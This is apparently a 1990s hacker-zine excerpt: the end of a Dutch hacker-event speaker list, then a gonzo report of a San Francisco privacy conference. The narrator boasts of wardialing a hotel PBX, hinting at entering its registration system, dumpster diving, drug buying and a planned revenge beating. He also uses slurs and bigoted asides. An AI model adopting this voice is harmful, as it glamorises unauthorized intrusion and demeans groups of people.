a hacker's control over his first system 21 years ago and never ceased
the good work. Now lecturing, teaching and publishing on computer
insecurity and imprivacy at the technical university in Delft. His
thesis: 'penetrating a system is not perpetrating a crime'.

Ronald 'RGB' O. (rgb@utopia.hacktic.nl) has the distinction of being the
only Dutch hacker arrested before and after the new law went into effect.
He is a self-taught UNIX security expert and a writer for Hack-Tic
Magazine.

Ruud Wiggers (ruudw@cs.vu.nl), system manager at the Free University
(VU) in Amsterdam, has for 10 years been trying to plug holes in system
security. He was involved in the RGB arrest.

Andy Mueller-Maguhn (andy@cccbln.ccc.de) is from the Chaos Computer Club
in Germany.

Eric Corley (emmanuel@eff.org) a.k.a. Emmanuel Goldstein is editor
of the hacker publication '2600 magazine'. The first person to realize
the huge implications of the government crackdown on hackers in the US.

Winn Schwartau (wschwartau@mcimail.com) is a commercial computer
security advisor as well as the author of the book 'Terminal
Compromise'. His new book entitled 'Information Warfare' has just been
released.

Ray Kaplan (kaplan@bpa.arizona.edu) is a computer security consultant.
He is constantly trying to bridge the gap between hackers and the
computer industry. He organizes 'meet the enemy' sessions where system
managers can teleconference with hackers.

Wietse Venema (wietse@wzv.win.tue.nl) is a systems expert at the
Technical University in Eindhoven. He is the author of some very well
known utilities to monitor hacking on unix systems. He has a healthy
suspicion of anything technical.

Peter Klerks (klerks@rulfsw.leidenuniv.nl) is a scientist at the centre
for the study of social antagonism at the Leiden University. He has
studied the Dutch police force extensively, and is author of the book
'Counterterrorism in the Netherlands.'

Don Stikvoort (stikvoort@surfnet.nl), one of the computer security
experts for the Dutch Academic Society and chairman of CERT-NL (Computer
Emergency Response Team). He is also actively involved in SURFnet
network management.

Rop Gonggrijp (rop@hacktic.nl) was involved in some of the first
computer break-ins in the Netherlands during the 80's and is now editor
of Hack-Tic Magazine.

The discussion will be led by Francisco van Jole (fvjole@hacktic.nl),
journalist for 'De Volkskrant'.

whatever you have and we'll see how and if we can hook it up.

We're going to have ethernet connected to Internet (TCP/IP). You can
connect by sitting down at one of our PC's or terminals, by hooking up
your own equipment (we have a depository, so don't worry about theft),
or by using one of our 'printerport <--> ethernet' adapters and
hooking up laptops and notebooks that way. There may be a small fee
involved here, we don't know what they're going to cost us. Contact us
for details, also if you have a few of these adapters lying around.
There might also be serial ports you can connect to using a nullmodem
cable.

You can log in to our UNIX system(s) and send and receive mail and
UseNet news that way. Every participant that wants one can get her/his
own IP number to use worldwide. Users of the network are urged to make
whatever files they have on their systems available to others over the
ethernet. Bring anything that has a power cord or batteries and let's
network it!

Fear & Loathing in San Francisco

By Some Guy

(The names have been changed to protect the guilty.)

1. The Arrival

I had been up for about 48 hours by the time America West dropped
me off at San Francisco's airport.  The only thing I could think about
was sleep.  Everything took on strange dreamlike properties as I staggered
through the airport looking for the baggage claim area.  Somehow, I
found myself on an airport shuttle headed towards the Burlingame
Marriott.  Suddenly I was standing in front of an Iranian in a red
suit asking me for a major credit card.  After a quick shuffle of forms
at the checkin counter I finally had the cardkey to my room and was
staggering toward a nice warm bed.

Once in the room I fell down on the bed, exhausted.  Within the space of a
few minutes I was well on my way to Dreamland.  Within the space of a few
more minutes I was slammed back into reality as someone came barreling into
the room.  Mr. Blast had arrived from Chitown with a bag full of corporate
goodies.  I accepted a shirt and told him to get lost.  No sooner had he left
than Fitzgerald burst in with enough manuals to stock a small college's
technical library.  After griping for nearly 30 minutes at the fact that
I had neglected to likewise bring 500 pounds of 5ess manuals for him,
Fitzgerald took off.

Sleep.

2. Mindvodxka

After several needed hours rest, I took off downstairs to scope out the
spread.  I ran into Bruce Sterling who relayed some of the mornings
events, the highlight of which was Don Delaney's "Finger Hackers"  the
inner city folks who sequentially dial, by hand, every possible combination
of pbx code to then sell on street corners.

Out of the corner of my eye I spotted two young turks dressed like
mafioso:  RBOC & Voxman.  I wandered over and complimented them on their
wardrobe and told them to buy me drinks.  Beer.  Beer.  More beer.
Screwdrivers.  Screwdrivers.  Last call.  Last screwdriver.

RBOC and I decided that it was our calling to get more drinks.  We took
off to find a bar.  Upon exiting the hotel we realized that we were in
the middle of fucking nowhere.  We walked up and down the street, rapidly
getting nowhere.  In our quest for booze, we managed to terrorize a
small oriental woman at a neighboring hotel who, after 10 minutes of our
screaming and pounding, finally opened up the door to her office wide
enough to tell us there were no bars within a 15 mile radius.
We went back to the hotel very distraught.

We went back to RBOC's room where Voxman was sampling a non-tobacco smoke.
We bitched about the lack of watering holes in the vicinity, but he was
rather unsympathetic.  After he finished his smoke and left the room, we
decided to order a bottle of vodka through room service and charge it
to Voxman since it was roughly 50 dollars.

RBOC called up room service and started to barter with the clerk about the
bottle.  "Look, tell you what," he said, "I've got twenty bucks.  You meet
me out back with two bottles.  I give you the twenty and you keep one of
the bottles for yourself."

"Look man, I know you have about a thousand cases of liquor down there,
right?  Who's going to miss two bottles?  Don't you want to make a few
extra bucks?  I mean, twenty dollars, that's got to be about what you make
in a day, right?  I mean, you aren't exactly going to own this hotel any
time soon, am I right?  So, I'll be down in a few minutes to meet you
with the vodka.  What do you mean?   Look man, I'm just trying to help out
another human being.  I know how it is, I'm not made out of money either,
you know?  Listen, I'm from NYC...if someone offers me twenty dollars
for nothing, I take it, you know?  So, do we have a deal?"

This went on for nearly an hour.  Finally RBOC told the guy to just bring up
the damn bottle.  When it arrived, the food services manager, acting as
courier, demanded proof of age, and then refused to credit it to the room.
This sparked a new battle, as we then had to track down Voxman to sign
for our booze.  After that was settled, a new crisis arose:  We had no
mixer.

The soda machine proved our saviour.  Orange Slice for only a dollar a
can.  We decided to mix drinks half and half.  Gathering our fluids,
we adjourned to the lobby to join Voxman and a few conventioneers.
The vodka went over well with the crew, and many a glass was quaffed
over inane conversation about something or other.

Soon the vodka informed me it was bed time.

3. It Begins.

I woke late, feeling like a used condom.  I noticed more bags in the room
and deduced that X-con had made it to the hotel.  After dressing, I staggered
down to the convention area for a panel.

"Censorship and Free Speech on the Networks" was the first one I got to
see.  The main focus of the panel seemed to be complaints of alt.sex
newsgroups and dirty gifs.  As these two are among my favorite things
about the net, I took a quick disliking of the forum.  Nothing was resolved
and nothing was stated.

There was a small break during which I found X-con.  We saw a few feds.
It was neat.  The head of the FBI's computer crime division called me by name.
That was not terribly neat.

The next session was called "Portrait of the Artist on the Net."  X-con
and I didn't get it.  We felt like it was "portrait of the artist on
drugs on the net."  Weird videos, odd projects, and stream of
consciousness rants.  Wasn't this a privacy conference?   We were confused.

The session gave way to a reception.  This would have been uneventful had
it not been for two things:  1) an open bar 2) the arrival of the Unknown
Hacker.  U.H. was probably the most mysterious and heralded hacker on
the net.  The fact that he showed up in public was monumental.

The reception gave way to dinner, which was uneventful.

4. Let the Beatings Begin

A few days before the con, Mr. Blast had scoured the net looking for
dens of inequity at my behest.  In alt.sex.bondage he had run across
a message referring to "Bondage A Go-Go."   This was a weekly event at
a club in the industrial district called "The Bridge."  The description
on the net described it as a dance club where people liked to dress up
in leather and spikes, and women handcuffed to the bar from
9-11 drank free!  This was my kind of place.

On that Wednesday night, I could think of nothing but going out and
getting to Bondage A Go-Go.  I pestered X-con, Mr. Blast and U.H. into
going.  We tried to get Fender to go too, but he totally lamed out.
(This would be remembered as the biggest mistake of his life.)

We eventually found ourselves driving around a very seedy part of
San Francisco.  On one exceedingly dark avenue we noticed a row
of Harleys and their burly owners hanging outside a major dive.  We
had found our destination.

Cover was five bucks.  Once inside we were assaulted by pounding
industrial and women in leather.  RAD!  Beer was a buck fifty.
Grabbing a Coors and sparking a Camel, I wandered out to the main dance
floor where some kind of event was taking place.

Upon a raised stage several girlies were undulating in their
dominatrix get-ups, slowly removing them piece by piece.  A smile
began to form.  X-con and U.H. found me and likewise denoted their
approval.  The strip revue continued for a few songs, with the
girlies removing everything but their attitudes.

The lights went up, and a new girl came out.  She was followed by a
friend carrying several items.  The first girl began to read rather
obscure poetry as the second undressed her.  Once girl1 was free
of restrictive undergarments girl2 donned surgical gloves and
began pouring generous amounts of lubricant over her hands.  As the
poetry reached a frantic peak, girl2 slowly inserted her entire hand
into girl1.

A woman in the crowd screamed.

My smile was so wide, it hurt.

The fisting continued for an eternity, with girl1 moving around the stage
complaining in her poetic rant about how no man could ever satisfy her.
(This was of no surprise to me since she had an entire forearm up her twat.)
Girl2 scampered around underneath, happily pumping away for what seemed like
an hour.

When the performance ended, a very tall woman in hard dominatrix gear
sauntered out on the stage.  From her Nazi SS cap to her stiletto heels
to her riding crop, she was the top of my dreams.  Two accomplices tied
a seemingly unwilling bottom to the stage and she began striking
her repeatedly with the crop, to the beat of something that sounded like
KMFDM.  The screams filled the club, and drool filled the corners of my
mouth.

As the song ended, the girls all came back out on stage and took a bow
to deafening applause.  Then the disco ball lit up, and Ministry began
thundering, and people began to dance like nothing had ever
happened.  We were a bit stunned.

We all wandered up to the second level where we were greeted by a guy and
two girls going at it full on.  I staggered dazed to the second story on the
opposite side.  There was a skinhead getting a huge tattoo and a girl
getting a smaller one.  I was not brave enough to risk the needle in
San Francisco, so I wandered back downstairs.  That's where I fell in love.

She was about 5'2", clad in a leather teddy, bobbed blood red hair, carrying
a cat o'nine tails.  Huge, uh, eyes.  Alas, 'twas not to be.  She was
leading around a couple of boy toys on studded leashes.  Although the
guys seemed to be more interested in each other than her, I kept away,
knowing I would get the hell beaten out of me if I intervened.

As it approached 3:00 am, we decided it was time to go.  We bid a fond
farewell to the Bridge and took leave.

We all wanted to see Golden Gate, so U.H. directed us towards downtown
to the bridge.  Passing down Market, we noticed a man lying in a pool of
blood before a shattered plate glass window, surrounded by cops.

We eventually reached the Golden Gate Bridge.  We drove across to the
scenic overlook.  Even in the darkness it was rather cool.  We took off
through the hills and nearly smashed into a few deer with the car.
It was almost time for the conference by then, so we decided to get back.

5. Thursday

I made it downstairs for the "Medical Information and Privacy" that
morning.  As I was walking towards the room, I got a sudden flash of
an airlines advertisement.  The Pilot had arrived.  I was shocked.
Here was this guy who used to be one of the evil legionnaires, and he
looked like an actor from a delta commercial...blue suit, aviator
sunglasses, nappy hat with the little wings.  Appalling.

I drug him into the meeting hall where we sat and made MST3K-like
commentary during the panel.  I began to get mad that no one had
even mentioned the lack of legislation regarding medical records privacy,
nor the human genome project.  I was formulating my rude commentary
for the question period when the last speaker thankfully brought
up all these points, and chastised everyone else for not having done
so previously.  Good job.

I snaked The Pilot a lunch pass, and we grabbed a bite.  It was pretty
good.  I noticed that it was paid for by Equifax or Mead Data Central
or some other data-gathering puppet agency of The Man.  No doubt a
pathetic ploy to sway our feelings.  I ate it anyway.

After lunch, John Perry Barlow got up to bs a bit.  The thing that stuck me
about Barlow was his rant about the legalization of drugs.  Yet another
stray from computers & privacy.  It must be nice to be rich enough to
stand in front of the FBI and say that you like to take acid and think
it ought to be legal.  I debated whether or not to ask him if he
knew where to score any in San Francisco, but decided on silence, since
I'm not rich.

I lost all concept of time and space after Barlow's talk, and have no idea
what happened between that time and that evening.

6. Birds of a Feather BOF together

That night we went to the Hacker BOF, sponsored by John McMullen.
Lots of oldies siting around being superior since it wasn't illegal
when they swiped cpu access, and lots of newbies sitting around feeling
superior since they had access to far better things than the oldies
ever dreamed of.

A certain New York State Policeman had been given the remainder of the
bottle of vodka from the previous night.  It was gone in record time.
Later he was heard remarking about how hackers should get the death
penalty.  When Emmanuel Goldstein demonstrated his Demon Dialer from
the Netherlands, he sat in the corner slamming his fist into his hand
muttering, "wait till we get home, you'll get yours."

I went outside and hid.  Also hiding outside was Phiber.  We exchanged a
few glares.  He and I had been exchanging glares since our respective
arrivals.  But neither of us said anything directly to the other.
I had heard from several people that Phiber had remarked, "on the third
day, I'm gonna get that guy.  Just you wait."  I was waiting.

I decided that Thursday should be the night we would all go to a
strip club.  After telling everyone within a 15 mile radius about
Bondage A Go-Go, it was rather easy to work up an interest in this
adventure.  Me, X-con, Mr. Blast, U.H. and Fender would be the
valiant warriors.

Before making preparations to leave, X-con and Fitzgerald decided to
check out the hotel's PBX.  Setting up Tone-Loc, X-con's notebook
set out banging away at the available block of internals.  We
decided that the hotel had a 75, and yes, it would be ours, oh yes,
it would be ours.

It was a Herculean task to gather the crew.  Despite their desire to go,
everyone farted around and rounding them up was akin to a cattle
drive.  Fender cried about having to attend this BOF and that BOF and
Mr. Blast cried about being tired, Fitzgerald cried about not being
old enough to go, and I just cried.  Eventually we gathered our
crew and launched.

8.  Market Street Madness

We initially went out to locate the Mitchell Brothers club.  I had heard that
it was quite rad.  Totally nude.  Lap dancing.  Total degradation and
objectification.  Wowzers.

U.H. said he knew where it was.  He was mistaken.  The address in the
phone book was wrong.  It was nowhere to be found.  We ended back up
on Market surrounded by junkies and would-be muggers.  Thankfully,
there were no fresh corpses.  I saw a marquee with the banner Traci Topps.

Forcing Mr. Blast to pull over, we made a beeline to the entrance.
Cover was ten dollars, and we had missed Traci's last performance.
We paid it anyway, since we had bothered to pull over.  Big mistake.

Now, when I think of strip clubs, I think of places like Houston's
Men's Club, or Atlanta's Gold Club, or Dallas' Fantasy Ranch.  Very
nice.  Hot women.  Good music.  Booze.  Tables.

We entered a room that used to be a theater.  Sloping aisles along
theater seats side by side.  Up on the stage, was a tired, unattractive,
heavy set brunette slumping along to some cheesy pop number.
I was instantly disgusted.  I felt compelled to tell X-con that strip
clubs were not like this normally, since he had never been to one, and
it was my bright idea to be here.

We noticed some old perv at the far end of our row in a trench.  It was
like out of a bad movie.  He was not at all shy about his self-satisfaction
and in fact seemed quite proud of it.  He kept trying to get the girls to
bend down so he could fondle them.  Gross beyond belief.  We debated
whether or not to point and laugh at him, but decided he might have
something more deadly concealed under the trench and tried to ignore it.

Some more furniture passed across the stage.  One sauntered over to me
and asked if I'd like any company.  I asked her what the hell this place
was all about.  She said that this was the way most places were downtown.
I told her that I expected tables, beer, and a happy upbeat tempo.  She
shrugged and said she didn't know of anything really like that.

On the stage a really cute girl popped up.  A shroom on this turd of a club.
Fender and I both decided she was ours.  Fender said there was no way that
I would get the only good looking girl in the place.  I said he needed to
get real, that it would be no contest.

As soon as she left the stage, Fender disappeared.  Later he returned
smirking.  Moments afterward, the girl appeared and plopped down in his lap.
(We found out later he paid her.)  He continued his dialogue for about
20 minutes discussing philosophy or something equally stupid to talk
to a nude dancer about, and then we got up to leave.  She gave him her
phone number.  (It was the number to the Special Olympics.)  We left,
and I apologized to everyone.

We took off to Lombard street and fantasized about letting the rental
car loose to plummet down the hill, destroying everything in its
path.  Next time we decided we would.

Then it was decided that it would be a good idea to look for some food.
We ended up somewhere where there was some kind of dance club.
Everything was closed and there was no food to be seen.  Walking down
a few side streets looking for food, U.H. decided to tell Fender that
he had broken into his machine.  Fender turned about 20 shades of green.

We then went back to the Golden Gate Bridge since it never closed and
stared out at the bay.   Fender began to talk incoherently so it
became urgent that we get back to the hotel and put him to bed to dream
happy dreams of his stripper Edie.

Back at the hotel X-con and I could not sleep.  The notebook had found
a number of carriers.  One was for a System V unix.  We decided that
this was the hotel's registration computer.  We knew most used some kind of
package like encore, so we...well.  :)  We also found several odd systems,
probably some kind of elevator/ac/power controllers or whatnot.

At 5am or so, X-con and I took off to explore the hotel.  Down in the lobby we
found RBOC busily typing away to a TTD operator on the AT&T payphone 2000.
He was engrossed in conversation, so we left him to his typing.
X-con started to look around the Hertz counter for anything exciting and
set off the alarm.  Within seconds security arrived to find me
perched on the shoeshine stand and X-con rapping on the payphone to
another hotel.  We told him we hadn't seen anyone go behind the counter.
He didn't believe us but left anyway.

As we burst into fits of laughter, Mitch Kapor, in shorts and t-shirt came
cruising by and exited through a glass door.  We weren't quite sure if he
were real so we snuck through the door after him.  The door led to the
gym.  Mitch was busily pedaling away on an exercycle.

X-con and I decided to explore the hotel since we never even knew there
was a gym, and who could tell what other wild and wacky places remained
unseen.  We took off to find the roof, since that was the most obvious
place to go that we should not be.  Finding the stairwell with roof access,
we charged up to the top landing.  The roof was unlocked, but right before
opening the hatch, we noticed that there was a small magnetic contact
connected to a lead.  Not feeling up to disabling alarm systems so
late in the evening (or early in the morning), we took off.
On another level, we found the offices.  Simplex locks.  Amazing.
Evil grins began to form, but we wimped out, besides it was damn near
convention time.

9.  Coffee, Coffee and More Coffee

Outside the convention room the caterers had set up the coffee urns.
X-con and I dove into the java like Mexican cliff jumpers.  It got
to be really really stupid.  We were slamming coffee like there was no
tomorrow.  Fuck tomorrow, we slammed it like there was no today.
I put about eight packets of sugar in each of my cups.  Ahh, nothing like
a steamin' cup o' joe.  By the time we were done we had each drank
nearly 20 cups.  The world was alive with an electric hum.  We were ready
to take on the entire convention.  Yep.  After another cup.

The first panel of the day was "Gender Issues in Computing and
Telecommunications."   As the talk began, the pig in me grew restless.
"What's all this crap?" it said.  "Bunch of feminazis bitching about
gifs.  They should all go to the bridge next Wednesday, that will give them
a new perspective.  Where's Shit Kickin' Jim when you need him?"
Then I got more idealistic in my thinking.  "Ok, fine, if women
demand equal treatment on the net, then what about equal treatment for
homosexuals?  What about equal treatment for hermaphrodites?  What about
equal treatment for one-legged retired American Indian Proctologists on
the net?  And let us not forget the plight of the Hairless.  Geez.  What
a load of hooey.   I wanted to jump up and yell, "THE NET IS NOT REAL!
WORRY ABOUT THE REAL WORLD AND THE NET WILL CHANGE!  YOU CANNOT CHANGE
REALITY BY CHANGING THE NET!"  If only I'd had another cup of coffee, I might
have done it.

The women got nothing done.  After the panel X-con and I took off to the
room, after getting a few cups of coffee for the elevator ride.  We sat
in the hotel room and made rude noises until Mr. Blast and Fitzgerald
got up.  We all fought for the shower and by noon we were ready to
venture outward for lunch.

10. Cliffie!

The lunch that day had a few pleasant surprises.  The first came in the
form of a waitress with HUGE, uh, eyes.  Having something of an
fetish for big, ahem, eyes, I practiced my patented Manson-like gaze
for her benefit.  The second surprise came when a the CFP staffers
cornered a couple of people at our table.

KCrow and Xaen had photocopied lunch tickets and forged badges to hang
out at the conference.  Finally, on the last day, the staffers suddenly
decided that these two might not be paying attendees.  Whether it was
the names on their badges that did not check out, or the fact that
Xaen had been walking around in a red and white dress-like robe the entire
day.  They let them stay, but told them next time to either make better
forgeries or send in their scholarship applications like everyone else.

As lunch drew to a close, the crowd grew restless.  A cry rang out,
"CLIFFIE!"  The crowd took up the cry, and executives began throwing
conference papers in the air, stomping their feet and holding up
their lit cigarette lighters.  "We want Cliffie, we want Cliffie!"
The house lights dimmed and a silhouette of frazzled hair appeared at the
head of the room.

Well, maybe it wasn't quite like that.  Cliff Stoll took the stand and
began a stream of consciousness rant that would make someone with a bipolar
disorder look lucid.  Contorting himself and leaping on tables, Cliff
definitely got my attention.  It was kind of like watching Emo Philips
on crank while tripping.  I dug it.  If you have the opportunity
to catch Cliff on his next tour, make sure to do so.  Lorne Michaels could
do worse than make some kind of sitcom around this guy.  It was
probably the most amazing thing I had seen at the official conference.

11. A Little Bit O' History

Fitzgerald heard that there was a Pac Bell museum downtown.  This news
evoked a Pavlovian response almost as pronounced as me at The Bridge.
Me and The Pilot wanted to check it out too so we decided to go.
It was like the Warner Bros. cartoon of the big dog and the little dog
"huh Spike, we gonna get us a cat, aren't we Spike, yep, we are gonna get
that cat, boy, aren't we Spike, yep, yep, boy I can't wait, boy is that
darn cat gonna be sorry, isn't he Spike, huh, Spike, huh?"  Fitzgerald
was psyched.

Driving through downtown San Francisco was kind of like some kind of
deranged Nientendo game.  The streets were obviously layed out by farm
animals.  Traffic was disgusting.  Of course, 3:30 on Friday afternoon
is official road construction time in downtown San Francisco.  That was
not in my "Welcome To SF" guide, so I penciled it in.

About 4:00 we found an open lot, amazingly enough across from the
Pac Bell building.  We paid roughly 37 thousand dollars for the spot and
took off to the museum.  Fitzgerald was in heaven.  He had called the
museum from the hotel before we left and told them we were on our way.

Upon walking in the building we were stopped by a guard.  He asked us what
we wanted.  Fitzgerald said, "We're here for to see the museum!"  The
guard gave us the once over and said, "Museum's closed."  Fitzgerald
almost fainted.  Sure enough, the museum guy had bailed early.  Probably
immediately after receiving our phone call.  Typical telco nazi antics.

We took to the streets.  (The streets of San Francisco...haha)  Wandering
up and down the hills checking people out proved quite fun.  We checked out
Chinatown where we all decided that the little Oriental schoolgirls in their
uniforms were quite amazing.  We tried to spot the opium dens, and pointed
out suspect organized crime figures.  Suddenly, we realized we were lost,
and if we didn't get back to the lot we would lose our car.  (Thirty-seven
thousand dollars only buys you a spot for a few hours.)  We managed to
find our car minutes before the tow trucks rolled in and spent
a few more hours looking for buildings with good dumpsters for that night's
planned trashing spree.  We found a few spots and took off towards the
hotel and dinner.

12. Zen & The Art of Trashing

That night everyone decided to move into our room.  Somehow Fitzgerald stole
a bed and wheeled it into our room to allow for more sleep space.  So, it was
X-con, Fitzgerald, me, Fender and Mr. Blast all smashed into the little
room.  As we were sitting in the room discussing what to do that
evening, the door burst open and a large man in basketball sweats walked
in.  After he saw us in the room he turned around and quickly exited.

Fitzgerald ran out in the hall after him and discovered that the whole hall
was full of basketball players.  We called down to the front desk to complain
that our room had been given out.  The desk apologized and told us that the
mistake had been noticed and they would correct the problem with the
basketball team.  This did not exactly sit well with me, as I envisioned
shitloads of jocks rooting through our stuff, taking my camera and
various and sundry electronics gear.

Temporarily forgetting about the impending robberies, we took off to do
a little recon of our own.  The five of us and The Pilot piled into
two cars and took off towards downtown looking for garbage.

We found several Pac Bell offices but the only one with any type of
dumpster had nothing to offer save old yellow pages and pizza boxes.
We were totally bummed.  We decided to wander around aimlessly
to see what we could stumble across.

After making about a dozen turns and walking a mile or two we came across
a huge black beast of a building.  It looked like the Borg Cube.  It was
vast and foreboding.  It was an AT&T building.  Fitzgerald took off
towards the door to ask for a tour.  It was only 11:00 in the evening,
so we were certain that we would be given a hearty welcoming and
guided journey through the bowels of the cube.  Yeah, right.

Alas, we were not to be assimilated.  The guard told us to get lost.
We decided to see the Borg used dumpsters.  Around the back end of the
building by the loading docks we saw several stair landings starting about
three floors up.  We debated scaling the building, but noticed about
500 security cameras.  This place was possibly the most secure telco
installation we had ever seen.

We decided that this place must be the point of presence for the West Coast
since it was just so damn impenetrable.  As we turned to leave I noticed a
small piece of white cord on the ground.  As I picked it up, we noticed it
led from a small construction shack behind the POP.  It ran all the way
from the shack to a heavy steel door in the side of the cube where it
snaked its way under the door into the building and probably into the
frame.  We all had a great laugh at the exposed line, and wished we
would have had a test-set to make a few choice overseas calls.

We wandered back to the cars and ended up driving around downtown some
more for a few hours before ending up back at the hotel.

13.  Mr. Blast Can't Drive.

We all regrouped the next morning to go shopping downtown.  Fender was kind
enough to dish out vast quantities of chocolate-covered espresso beans
and we all got completely wired.  X-con and I decided that we should have had
a bag of these the previous morning.

We drove straight down to Chinatown and began looking for a place to park.
Mr. Blast, Fender, X-con were in one car, me, Fitzgerald and The Pilot
in another.  Mr. Blast, for being from a huge city, had absolutely no
concept of driving in traffic in a downtown setting.  He missed lots,
made weird turns, ran lights and generally seemed like he was trying
to lose us.  He achieved his desired goal.

We cursed his name for fifteen minutes and then gave up our search.
Fitzgerald had swiped Fender's scanner and was busily entertaining
himself listening to cellular phone calls.  He had the window rolled down
in the back seat and took great joy in holding up the scanner so people
walking down the street could join in on the voyeuristic fun.  Suddenly
Fitzgerald shouted, "HOLY SHIT!  I can't believe it!"

The Pilot and I nearly had matching strokes, "WHAT?" I said.  "It's
ENCRYPTED!  I can't believe it man, encrypted speech on the phone!"
I began to laugh, and The Pilot soon joined in.  It was Mandarin.
"Where the hell are we, Fitz?"  I asked him.  "San Francisco, " he replied.
"No," I said, "Specifically, where in San Francisco?"  Fitzgerald
thought for a minute and said, "Uh, Chinatown?"  Suddenly, his eyes
lit up, "OHHHHHHH.  Hehe..  it's not encrypted is it?"  We laughed at him
for about ten minutes.

We came to a stop light where a very confused Chinese lady was looking
at us.  Fitzgerald held up the scanner and I yelled, "Herro!"  We
went hysterical as we drove off, leaving the woman even more bewildered.

We found a place to park and decided to explore on our own.  The plethora
of little Chinese hotties blew my mind.  We staggered around Chinatown
trying to get bargains on electronics gear.  It struck us all as odd
that every electronics store in the downtown area was owned and
operated by Iranians.  Needless to say, no bargains were found.

We had lunch at a restaurant called Red Dragon.  The majority of the
lunch was spent talking telco.  Watching Fitz and The Pilot get totally
wrapped up in the talk, both trying to tell the best story about the
neatest hack proved incredibly interesting.

We took off into the crowds to try to find cheap watches, since The Pilot's
watch was ready to retire.  He soon made a totally sweet deal on a watch
from an oriental merchant and we took off for the car.  On the way we noticed
a small shop in a back alley with throwing stars in the window.

Inside was ninja heaven.  They had daggers, cloaks, stars, nunchaca,
swords, masks and tons and tons of violence inducing paraphanalia.  I saw
a telescoping steel whip behind a case.  I knew I must possess this item,
and when I found out that it was only $22.00 the money was already in
my hands.  Fitz also got a whip and five stars.  We were now armed...Phiber
beware.

We took off down to the port to look out at the bay.  While we were there
we watched a bunch of skaters doing totally insane street style in a small
cement fountain area.  One kid waxed the street with his face and we all
had a serious laugh, much to the chagrin of the injured and his posse.
As soon as they scraped up the hapless skatepunk off the ground,
they resumed their thrashing, avoiding the wet spot.  We decided
that these kids were totally insane.

We took off back to the hotel to meet up with the idiots.  Once we arrived
we found that we were locked out of our room.  In fact, not only had they
cut off our keys, but they had checked us out.  We got a security guard
to let us in the room.  Shortly thereafter X-con et.al. returned loaded
with gear they had picked up on their trip.  They exclaimed that they
rushed back to the hotel at top speed, since when they tried to call the
room, the hotel had said that our room was not in use.

I got furious and went downstairs to yell.  Eventually, we got our phone
service back and the manager went upstairs to give us a live body to
verbally abuse, which we took full advantage of.  He shucked and jived
his way through an apology but we did not get a free night as we had
hoped for.

14. Castro-Bound

X-Con wanted shoes.   We all sorted out the card key mess and piled back in
The Pilot's car and headed out to find NaNa's.  As we drove towards
the store we noticed something change about the city.  The fog lifted.
The colors got more pastel.  The men walking down the street seemed to
have more spring in their step.  We had entered the Castro.

I really wanted to hit a record store in the Castro because homos always
seem to have cool dance music.  I convinced everyone that we should pull
over and risk a quick walk down the main drag.

The stroll was a complete farce.  Our crew seemed to be extremely
apprehensive.  To make them more edgy I took great glee in talking
real nelly and batting my eyes at anything that moved.  No one was amused.
In fact, Fitzgerald and the Pilot looked like they wanted to cry and run
back to the car and hide.

None of the record stores had anything good.  There were lots of old
Judy Garland and Ethyl Merman but nothing more modern than the
Village People.  (And I was expecting techno.  But noooooo...)

On our way back to the car we passed by a leather goods store.  Not
exactly Tandycraft, if you get my drift.  X-con was the only one
brave enough to go in.  He came out looking drained of all color holding
a catalog.

"There were these three guys in there," he stammered.  "One of them was
being fitted for a cock sheath.  The two other guys kept showing him
different ones, but he said they were too big."

We all shuddered and hastened our return to the car.

We drove a few miles more down the street and ended up at the NaNa's shop.
The store was your typical alternative grunge-wear shop.  Stompin'
boots, nifty caps, shirts by Blunt.  X-con got his shoes.  We all got
nifty caps.  Leaving for the hotel, I grabbed a handful of flyers from
the front window.  Most were rave flyers for the next weekend.  One however
was announcing a bondage party for 'women only' two days later.  I felt a
tear begin to form as I reminisced about the Bridge.

15. Hating It In The Height.

We regrouped back at the hotel and took off again for the Height to go
check out Rough Trade records and see what could be seen.  And X-con
and I needed a few tabs.  (YEEE!)  We needed these rather badly since
Mr. Blast had found out about a rave that evening from the SF-RAVES
mailing list.  There was no way X-con and I could sit through a rave
sober, and dancing was WAY out of the question.

Rough Trade was closed.

We decided to grab a quick bite to eat while waiting for information
on the rave.  We decided to try something really odd, since we weren't in
for the typical corporate burger scene.  A bit down the street from
Rough Trade we happened upon a Ethopian restaurant.  Since this was about
as obscure as any of us had ever dreamed, we decided to check it out.
I personally didn't think Ethopians ever had any food, and made a few jokes
about wanting something light, so this would definitely be the place.

Ethopian food was odd.  Looking over the menu, Mr. Blast decided that
he didn't want much of anything they had to offer.  We decided that we
should buy a lot of everything and just pick and choose.  I made the
comment that I would only eat chicken, and Mr. Blast didn't like the
idea of eating much of anything everyone wanted to try.  We ordered
separately.

The food came out in a rather odd fashion.  Everything was piled on top
of everything else.  It was all splattered on top of a weird pancake-like
sponge bread.  There were all manner of sauces to smother, dip, or otherwise
destroy the entrees with, so we all took great bravado in our sampling of
each.  It was quite a fantastic spread, and I wholeheartedly urge everyone
to check out this particular cuisine.

After the meal we took off to find a phone to call the raveline.  On our
way to the phone X-con and I stumbled across a few transients who offered
us acid at a remarkable price.  This was almost too good to be true.
We slunk down a side street and bs'ed with the homeless couple as we
decided how many to buy.  We settled on 20 hits for 45 dollars.  X-con
and I were psyched.  The rave would indeed be tolerable.

We hooked up with the crew, smiling like Cheshire cats.  Mr. Blast had
the directions to the rave so we took off ready to overindulge.
By the time we reached the rave, we were one of what seemed like
a hundred or two hanging outside of a warehouse.  This might be
pretty damn cool.  X-con and I began our dosing.

Now, usually I love the first contact of the blotter with my tongue.
It evokes a certain tangy taste, akin to touching a battery to the tip
of your tongue.  It always gets the adrenaline flowing, and brings
back memories of what will soon be repeated.

Nothing.

I looked at X-con.  "Dude," he said, "I can't taste shit.  I better
take more."  He dropped about 3 more.  Still no taste.  I ate a few more
myself in a futile hope that some lysergine substance may have once resided
in the fibers of the blotter.  Nope.

This was the beginning.

As we waited to be let in to the warehouse, cursing the transients, the sirens
begin to wail.  Fucking great.  Five police cars swept into the cul-de-sac
that led to the warehouse.  The rave would not be in this location.  Everyone
bailed like rats from a sinking ship, yelling that the rave would be
moved to a soon to be announced location.

Now X-con and I were really pissed.  I whipped out my steel whip and said,
"Let's go pay a quick visit to the Height and visit our friends."
We piled back into the cars and set out to do some serious damage.

Arriving in the Height we noticed that cops were everywhere.  This was not
going to be easy.  X-con and I set out like men possessed.  The transients
were gone.  We wandered up and down the street for about 30 minutes looking
for our prey.  Finally we saw them.  They saw us.  One ran like a marathon
sprinter.  The other stayed, but was soon flanked by a gang of eight
other transients.  X-con walked right up and said "You fucking ripped us
off!"

As we tried to get either our money back or working drugs, more and more
transients gathered.  It was time to write it off as a loss.  We cursed
and backed away from the crowd.

